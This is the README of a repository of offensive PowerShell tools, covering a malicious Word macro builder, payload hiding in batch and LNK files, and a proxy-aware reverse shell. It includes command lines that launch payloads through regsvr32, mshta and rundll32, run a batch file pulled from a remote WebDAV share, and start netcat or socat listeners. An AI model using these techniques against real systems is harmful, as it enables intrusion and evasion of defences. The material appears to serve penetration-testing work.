PowerShell Scripts
============

Author: Arno0x0x - [@Arno0x0x](http://twitter.com/Arno0x0x)

This repository aims at publishing some of PowerShell scripts. No rocket science, just a few scripts I created either to learn PowerShell or to fit basic needs in my security veil.

Invoke-MacroCreator
----------------
Invoke-MacroCreator is a powershell Cmdlet that allows for the creation of an MS-Word document embedding a VBA macro with various payload delivery and execution capabilities.

Check the directory for further details and explanations.

Invoke-EmbedInBatch
----------------
Inspired by @xorrior, this scripts embeds and hide any type of payload within a batch file and then executes it given a command line specified as an argument. It proposes two different methods for achieving this trick, explained in the script header.
Examples:
```
Invoke-EmbedInBatch -PayloadPath installUtil.dll -FinalCommandLine "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U _payload_"
Invoke-EmbedInBatch -PayloadPath regsvr32.sct -FinalCommandLine "regsvr32.exe /s /u /i:_payload_ scrobj.dll"
Invoke-EmbedInBatch -PayloadPath standard.dll -Method 2 -FinalCommandLine "rundll32.exe _payload_,entrypoint"
Invoke-EmbedInBatch -PayloadPath payload.hta -FinalCommandLine "mshta.exe _payload_"
Invoke-EmbedInBatch -PayloadPath payload.exe -FinalCommandLine "_payload_"
```

The malicious batch file can then be executed locally on a target system, or even downloaded from a remote location with this command line:
`cmd.exe /k < \\webdavserver\folder\malicious_batch.txt`

Invoke-HideFileInLNK
----------------
This script creates a specifically forged link file (.lnk) to embed any type of file in it, as per the technique described here:
https://www.phrozen.io/page/shortcuts-as-entry-points-for-malware-part-3

The embedded file is first extracted from the link file using an inline VBS script, and the file is then called
either directly (if it's an executable or a script), or throuh a so called "Final Command". See examples section from the Invoke-HideFileInLNK function.

Invoke-SendReverseShell
----------------
This script sends a shell to a destination host (reverse shell). This is done:
  - on one side by spawning a cmd.exe child process and redirecting its standard Input, Output and Error streams
  - on the other side by either:
    - directly opening a TCP socket to the remote host, or
    - connecting through a proxy manually specified or by using the system's default one

When using a proxy to connect to the remote host, the proxy must support the CONNECT method and allow it to the destination port. If the destination port doesn't seem allowed by the proxy, try to bind your listener on port 443 as it's very likely that the proxy will allow the CONNECT method at least on that port.

The remote host simply has to listen on a TCP socket, for example:
  - With netcat: `# nc -l -p <any_port>`
  - With socat: `# socat TCP-L:<any_port>,fork,reuseaddr -`


proxyTunnel.ps1
----------------
This script creates a TCP tunnel towards a destination server through the system's default HTTP proxy, automatically handling upstream proxy authentication along the way if ever required. Tested OK with PowerShell v4.

A typical use would be for a client application that either can't handle connection through an HTTP proxy, or that doesn't support some sort of proxy authentication (eg: NTLM). So you would create a tunnel to the final destination (aka 'Origin Server') by having this script listening on a local network socket, and point your application to this local socket instead of the origin server. Well, basically a TCP tunnel...

Example:
```
powershell .\proxyTunnel.ps1 -bindPort 4444 -destHost myserver.example.com -destPort 22
```
From there, an SSH connection to 127.0.0.1:4444 will be tunneled, through the corporate proxy, to myserver.example.com:22

The scripts makes use of two hacks that might not work in future versions of PowerShell:
1. Forces the "CONNECT" method in the HttpWebRequest object, which is not officially allowed
2. Performs some reflective inspection in order to take control back over the underlying network stream once the connection is established (by default, the object is private)

I don't even understand why this is not made possible "by default" with the .Net API...

proxyMeterpreterHideout.ps1
----------------
This script is the client side script for a meterpreter stage download obfuscation technique for a reverse_winhttp payload.
Beware it does *NOT* work with the reverse_winhttpS payload.

Further explanations in the script itself.

![bitcoin](https://dl.dropboxusercontent.com/s/imckco5cg0llfla/bitcoin-icon.png?dl=0) Like these scripts ? Tip me with bitcoins !
![address](https://dl.dropboxusercontent.com/s/9bd5p45xmqz72vw/bc_tipping_address.png?dl=0)